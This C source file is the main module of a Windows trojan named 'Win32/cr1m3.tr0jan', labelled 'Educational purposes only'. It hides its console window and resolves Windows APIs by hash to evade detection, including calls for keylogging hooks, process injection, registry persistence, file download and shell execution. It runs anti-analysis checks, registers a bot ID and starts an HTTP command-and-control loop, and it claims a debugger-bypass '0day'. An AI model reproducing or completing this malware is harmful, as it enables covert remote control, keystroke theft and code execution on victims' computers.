/*
	Educational purposes only
	GPL LICENSE:  @Cr1m3 / JennyLab
	Win32/cr1m3.tr0jan
*/
#ifdef _MSC_VER
	#pragma comment(linker, "/SECTION:.text,EWR")
	#pragma optimize("gsym", on)						// optimize PE :D
	#pragma comment(linker, "/ENTRY:main")			// Who ARE YOU??
	//#pragma comment(linker, "/NODEFAULTLIB:yes")	// Fucking i don't need your dirty library. API Wrapping rulez!
	#pragma comment(linker, "/INCREMENTAL:NO")
	#pragma comment(linker, "/MTd")
	#pragma warning(disable: 4047)
	#pragma warning(disable: 4028)
	#pragma warning(disable: 4146)
	//#pragma optimize("", off) 
	#ifndef WIN32_LEAN_AND_MEAN
		#define WIN32_LEAN_AND_MEAN
	#endif
	#define __VISUALC__
#endif

#include "api.h"
#include "cc_monitor.h"
#include "task_reply.h"
#include "process.h"
#include "command.h"
#include "info.h"
#include "misc.h"
#include "security.h"
#include "inject.h"
#include "persistence.h"
#include "keylogger.h"
#include "md5.h"
#include "config.h"
#include "base64.h"
#include "pe.h"


// __declspec(dllexport) int __stdcall push_reply(char *msg, int option);
//__declspec(dllexport) int __stdcall cr1m3_mainDLL(HINSTANCE hInst, DWORD dwReason, void *lpReserved);

int cr1m3_init=0xBeBaCAFE;
//int os_version=4; // 0:WIN8.1, 1:NT, 2:XP, 3:Vista, 4:win7, 5:win8

extern int * find_kernel32();
extern int find_function(int *kernel_base, int api_hash);
int MakeIAT(void);
void HideME(void);
void __stdcall mainAPC(void *params);
void __stdcall mainInjected(void *params);
int __stdcall main();
int __stdcall WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow);
int __stdcall WinMainCRTStartup();
/*
extern unsigned int *__find_function(void *hDll, unsigned long ApiHash);
extern int *__findkern32(void);
*/


//Immunity debugger 0day (Entry point finder bypass code execution) // VC++ 2013 Win32 Debug.
#ifndef __TINYC__
	int __stdcall WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
		return(main());
	}


	int __stdcall WinMainCRTStartup() {
		return(main());
	}
#endif


int __stdcall main() {
	void *a = "DAFSFSF", *b = "FASDFSDFS";
	unsigned long im = __misc_imagebase();
	unsigned short isX64 = 0;
	
	if (__misc_is_wOw64() == 1)
		isX64 = 1;

	if(HIDE_ME==1)
		HideME();
	
	if(INIT_SLEEP>0)
		__time_sleep(INIT_SLEEP);

	MakeIAT();
//	_MessageBoxA(_GetForegroundWindow(), "Hello", "kitty", 1);
	
	//__pe_imp_reconstruct((unsigned long)im);
	
	//__inject_migration(2272,"lalalala");
	//_Sleep(2000);
	//__inject_dll(1068, "C:\\Users\\pumu\\Repository\\jennycorp\\jennysec\\jennylab\\tools\\gurru\\vc\\gurrukit\\Debug\\gurrukit.dll");
	//__inject_dll(3148, "C:\\Users\\pumu\\Repository\\jennycorp\\jennysec\\jennylab\\tools\\gurru\\vc\\gurrukit\\Debug\\gurrukit.dll");
	//_ExitProcess(0);

	if(SECURITY_STATUS==0x01) { // simple path point. if you will be like viruses, learn to write a f* code
		__security();
	}
	
	

	//__inject_dll(3128, "C:\\gurrukit.dll");

	//__persistence_disk();
	__set_botid();

//START C&C
//	_MessageBoxA(0x00, __b64_encode(a), __b64_encode(b), 0x00);
	_MessageBoxA(0x00, "Immunity Debugger 0day", "JennyLab", 0);
//	__process_findtoken(4);
	__bot_http(NULL);
	//__monitor_http(0);
	_ExitProcess(0);
	return 0;
}

void __stdcall mainAPC(void *params) {		mainInjected(params);return;		}

void __stdcall mainInjected(void *params) {
	_MessageBoxA(_GetForegroundWindow(), "Injected Main cr1m3", "cr1m3", 0);
}


void HideME(void) {
	_LoadLibraryA = find_function(find_kernel32(), 0xb1f3c09d);	
	_FreeConsole = find_function(find_kernel32(), 0x7d87d2e7); // sin comprobar
	_GetConsoleWindow = find_function(find_kernel32(), 0x1d588465); // sin comprobar 
	_ShowWindow =  find_function(_LoadLibraryA("user32.dll"), 0x41441e61); // sim comprobar 

	_ShowWindow(_GetConsoleWindow(), 0);
	_FreeConsole();
}



int MakeIAT(void) {

	//KERNEL32.DLL
	_WaitForSingleObject = find_function(find_kernel32(), 0x9934e679);
	_TerminateProcess = find_function(find_kernel32(), 0x884cac64);
	_CloseHandle = find_function(find_kernel32(), 0x78876373);
	
	_ExitProcess = find_function(find_kernel32(), 0xac4bf505);
	_GetProcessHeap = find_function(find_kernel32(),0xd9a29978); 
	_CreateProcessA = find_function(find_kernel32(), 0x91dc880d);
	_HeapFree = find_function(find_kernel32(), 0xa95f67ce);
	//_ZeroMemory = find_function(find_kernel32(), 0x0bcfa1a6);
	_Sleep = find_function(find_kernel32(), 0x6c465220);
	_GetSystemDirectoryA = find_function(find_kernel32(), 0x0d3329e7);
	_GetVolumeInformationA = find_function(find_kernel32(), 0xdd0ba95c);
	_LocalAlloc = find_function(find_kernel32(), 0xe950db24);
	_LocalFree = find_function(find_kernel32(), 0x41ab67af);
	_GetCurrentProcessId = find_function(find_kernel32(),  0xc1da04b9);
	_GetCurrentProcess = find_function(find_kernel32(),  0x455af9a0); //sin comprobar
	_OpenProcess = find_function(find_kernel32(), 0x3447f306);
	_GetVersionExA = find_function(find_kernel32(),0x9717f5b2);
	_GetProcAddress = find_function(find_kernel32(),0xcf1ed7e3);
	_LoadLibraryA = find_function(find_kernel32(), 0xb1f3c09d);		
	_CreatePipe = find_function(find_kernel32(), 0x1595a877);
	_WriteFile = find_function(find_kernel32(), 0x487a980f);
	_ReadFile = find_function(find_kernel32(), 0xc71ed7ce);
	//_CloseHandle = find_function(find_kernel32(), 0x79076373); 	
	_PeekNamedPipe = find_function(find_kernel32(), 0x5602433d);
	_GetExitCodeProcess = find_function(find_kernel32(), 0x68292c48);
	_SetConsoleCtrlHandler = find_function(find_kernel32(), 0x945e89a7);
	_lstrlenA = find_function(find_kernel32(), 0x3da35923);
	_lstrcpynA = find_function(find_kernel32(), 0x4b101943);
	_lstrcpyA = find_function(find_kernel32(), 0x406408ff);
	_lstrcatA = find_function(find_kernel32(), 0x3f2318ff);
	_lstrcmpiA = find_function(find_kernel32(), 0x49cf8937);
	_FreeConsole = find_function(find_kernel32(), 0x7d87d2e7); 
	_GetConsoleWindow = find_function(find_kernel32(), 0x1d588465); 
	_GetComputerNameA = find_function(find_kernel32(), 0x0fe5d33b); 
	_SetHandleInformation = find_function(find_kernel32(), 0xeec43691); 
	_CreateThread = find_function(find_kernel32(), 0x71c871c5);
	_TerminateThread = find_function(find_kernel32(), 0x27b0e61e); 
	_SetFileApisToANSI = find_function(find_kernel32(), 0x013bf62a);
	_VirtualAlloc = find_function(find_kernel32(), 0xc2ade4ab); 
	_VirtualFree = find_function(find_kernel32(), 0xb5d18314); 
	_WideCharToMultiByte = find_function(find_kernel32(), 0xbab11972); 
	_CheckRemoteDebuggerPresent = find_function(find_kernel32(), 0x0167901c); 
	_GetModuleHandleA =  find_function(find_kernel32(), 0x63d88cb6); 
	_GetModuleFileNameA = find_function(find_kernel32(), 0xa40c664e);
	_VirtualAllocEx = find_function(find_kernel32(), 0xef8abca2);
	_VirtualFreeEx = find_function(find_kernel32(), 0x29714bd5);
	_ExitThread = find_function(find_kernel32(), 0x24d36aae);
	//_CopyMemory = _GetProcAddress(_LoadLibraryA("kernel32.dll"), "CopyMemory");
	_GetWindowsDirectoryA =  find_function(find_kernel32(), 0xb08d5de2); // sin comprbar
	_CopyFileA = find_function(find_kernel32(), 0x1ba808e7);
	_GetTempPathA = find_function(find_kernel32(), 0x4f93659d); // sin comprobar
	_GetProcessId = find_function(find_kernel32(), 0x90cc1628); // sin comprobar

	//Secur32.dll
	_GetUserNameExA = find_function(_LoadLibraryA("secur32.dll"), 0x6552188e);
	
	//CRYPT32.dll
	_CryptBinaryToStringA = find_function(_LoadLibraryA("crypt32.dll"), 0xcc2564f4);
	_CryptStringToBinaryA = find_function(_LoadLibraryA("crypt32.dll"), 0x4dd2e347);


	//USER32.DLL
	_MessageBoxA = find_function(_LoadLibraryA("user32.dll"), 0x1f93d0a0);
	_GetForegroundWindow = find_function(_LoadLibraryA("user32.dll"), 0xff2311c8);
	_ShowWindow =  find_function(_LoadLibraryA("user32.dll"), 0x41441e61); // sim comprobar 
	_GetFocus = find_function(_LoadLibraryA("user32.dll"), 0x7f633880); //sin comprobar
	_SetWindowsHookExA = find_function(_LoadLibraryA("user32.dll"), 0x62912f9e);  // sin comprobar
	_GetMessageA = find_function(_LoadLibraryA("user32.dll"), 0x30d7515b); // sin comprobar
	_TranslateMessage = find_function(_LoadLibraryA("user32.dll"), 0x2a412d62); // sin comprobar

	_DispatchMessageA = find_function(_LoadLibraryA("user32.dll"), 0xc8e0d0fa); // sin comprobar
	_GetKeyState = find_function(_LoadLibraryA("user32.dll"), 0x0c9871cb); // sin comprobar
	_CallNextHookEx = find_function(_LoadLibraryA("user32.dll"), 0xe26e2e0d); // sin comprobar



	//WININET.DLL
	_InternetCloseHandle = find_function(_LoadLibraryA("wininet.dll"), 0x1cfded03);
	_InternetReadFile = find_function(_LoadLibraryA("wininet.dll"), 0xb03c7a32);
	_HttpOpenRequestA = find_function(_LoadLibraryA("wininet.dll"), 0xe30f218a);
	_InternetConnectA = find_function(_LoadLibraryA("wininet.dll"), 0x803f5b2a);
	_InternetOpenA = find_function(_LoadLibraryA("wininet.dll"), 0x64cdba9a);
	_HttpSendRequestA = find_function(_LoadLibraryA("wininet.dll"), 0x331523ca);


	//ADVAPI32.DLL
	_GetUserNameA = find_function(_LoadLibraryA("advapi32.dll"), 0x84d4751d);
	_InitializeSecurityDescriptor = find_function(_LoadLibraryA("advapi32.dll"), 0x6de4412e);
	_SetSecurityDescriptorDacl = find_function(_LoadLibraryA("advapi32.dll"), 0x9a98438c);
	_CryptCreateHash = find_function(_LoadLibraryA("advapi32.dll"), 0xdc45a17d); // sin comprobar
	_CryptAcquireContextA = find_function(_LoadLibraryA("advapi32.dll"), 0x11b587e2); //sin comprobar
	_CryptHashData = find_function(_LoadLibraryA("advapi32.dll"), 0x375f368a); //sin comprobar
	_CryptGetHashParam = find_function(_LoadLibraryA("advapi32.dll"), 0x45578288); //sin comprobar
	_CryptDestroyHash = find_function(_LoadLibraryA("advapi32.dll"), 0xef466e0c); //sin comprobar
	_CryptReleaseContext = find_function(_LoadLibraryA("advapi32.dll"), 0x160b844a); //sin comprobar
	_GetComputerNameExA = find_function(_LoadLibraryA("advapi32.dll"), 0x7b33f13f);
	_RegCreateKeyExA = find_function(_LoadLibraryA("advapi32.dll"), 0xb9a498d7); // sin comprobar
	_RegSetValueExA = find_function(_LoadLibraryA("advapi32.dll"), 0x9d2fd640); // sin comprobar




	//URLMON.DLL
	_URLDownloadToFileA = find_function(_LoadLibraryA("urlmon.dll"), 0x8afd4a5b);

	//MSVCRT.DLL l0l very dirty
	_crt_popen = find_function(_LoadLibraryA("msvcrt.dll"), 0x895ec22a);
	_crt_pclose = find_function(_LoadLibraryA("msvcrt.dll"), 0x7fe2f805);
	_crt_fread = find_function(_LoadLibraryA("msvcrt.dll"), 0x7e46522c);
	_snprintf = find_function(_LoadLibraryA("msvcrt.dll"), 0x5b81e8ec);
	_getenv = find_function(_LoadLibraryA("msvcrt.dll"), 0x80a01246);
	_printf = find_function(_LoadLibraryA("msvcrt.dll"), 0x8f22e20a);
	_atoi = find_function(_LoadLibraryA("msvcrt.dll"), 0x1bc741ed);  
	_toupper = find_function(_LoadLibraryA("msvcrt.dll"), 0x8e62c972); // sin comprobar

	//Shell32.dll
	_ShellExecuteA = find_function(_LoadLibraryA("shell32.dll"), 0xe26cf79c);

	//SHWLAPI.DLL
	_PathFileExistsA = find_function(_LoadLibraryA("shlwapi.dll"), 0xc0f1d4bb); //sin comprobar



	//NTDLL.DLL
	_ZwSetInformationProcess = find_function(_LoadLibraryA("ntdll.dll"), 0x722cfe07); 
	_NtQueryInformationProcess = find_function(_LoadLibraryA("ntdll.dll"), 0x547acdad); 
	_NtQuerySystemInformation = find_function(_LoadLibraryA("ntdll.dll"), 0x9d89a72a); 
	_NtTerminateProcess = find_function(_LoadLibraryA("ntdll.dll"), 0x9bccacd8); 
	_RtlCreateUserThread = find_function(_LoadLibraryA("ntdll.dll"), 0xcac4fc19); 
	_RtlAdjustPrivilege = find_function(_LoadLibraryA("ntdll.dll"), 0x959a103b); 
	_RtlImageNtHeader = find_function(_LoadLibraryA("ntdll.dll"), 0xcfb2f418); 
	_NtOpenProcess = find_function(_LoadLibraryA("ntdll.dll"), 0x36184106);
	_NtWriteVirtualMemory = find_function(_LoadLibraryA("ntdll.dll"), 0x84bc91b9); 
	_NtClose = find_function(_LoadLibraryA("ntdll.dll"), 0x5fe3f6f5); 
	_NtWaitForSingleObject = find_function(_LoadLibraryA("ntdll.dll"), 0xe734e849); 
	

	// CoLiSioNS
	_HeapAlloc = _GetProcAddress(_LoadLibraryA("kernel32.dll"), "HeapAlloc"); // 0xf12ac824);
	_ZeroMemory = _GetProcAddress(_LoadLibraryA("kernel32.dll"), "RtlZeroMemory");
	_GetStartupInfoA = _GetProcAddress(_LoadLibraryA("kernel32.dll"), "GetStartupInfoA");
	_CloseHandle = _GetProcAddress(_LoadLibraryA("kernel32.dll"), "CloseHandle");
	_GetComputerNameExA = find_function(_LoadLibraryA("kernel32.dll"), 0x7b33f13f); //"GetComputerNameExA"); //NO FUNCIONA 
	_GetCommandLineA = _GetProcAddress(_LoadLibraryA("kernel32.dll"), "GetCommandLineA");
	_VirtualProtect = _GetProcAddress(_LoadLibraryA("kernel32.dll"), "VirtualProtect");
	_CopyMemory = _GetProcAddress(_LoadLibraryA("kernel32.dll"), "CopyMemory");
	_VirtualQuery = _GetProcAddress(_LoadLibraryA("kernel32.dll"), "VirtualQuery");
	_ExitThread = _GetProcAddress(_LoadLibraryA("kernel32.dll"), "ExitThread");
	
	if ((_GetModuleBaseName = _GetProcAddress(_LoadLibraryA("kernel32.dll"), "GetModuleBaseNameA")) == NULL)
		_GetModuleBaseName = _GetProcAddress(_LoadLibraryA("psapi.dll"), "GetModuleBaseNameA");


	//libs
	_LoadLibraryA("msvcrt.dll");

	return(0);
}




/*
int __stdcall cr1m3_mainDLL(HINSTANCE hInst, DWORD dwReason, void *lpReserved) {

	switch(dwReason) {
	case 1:
	case 2:
		main();
		break;
	case 0:
	case 3:
	default:
		break;
	}

	return 0;
}
*/
